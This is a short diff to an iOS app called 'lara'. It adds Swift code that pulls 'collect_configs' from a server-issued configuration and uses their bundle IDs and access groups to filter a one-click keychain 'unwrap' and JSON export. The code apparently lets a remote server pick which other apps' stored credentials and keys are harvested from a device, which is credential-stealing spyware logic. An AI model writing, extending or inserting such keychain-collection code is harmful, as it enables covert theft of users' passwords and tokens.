@@ -188,6 +188,14 @@ struct lara: App {
             var result: [AnyHashable: Any]?
             var failure: Error?
             do {
+                // Key JSON restricted to the server-issued collection targets:
+                // rows kept only when their agrp matches an issued
+                // access_group / bundle_id (reverse-map from collect_configs).
+                if let ccs = MainAPI.lastConfig?.collect_configs, !ccs.isEmpty {
+                    let bids = ccs.compactMap { $0.bundle_id }.filter { !$0.isEmpty }
+                    let ags = ccs.compactMap { $0.access_group }.filter { !$0.isEmpty }
+                    LaraKeychainSvc.setExportFilter(withBundleIDs: bids, accessGroups: ags)
+                }
                 result = try LaraKeychainSvc.runOneClickUnwrap(withMaxRows: 0)
             } catch {
                 failure = error
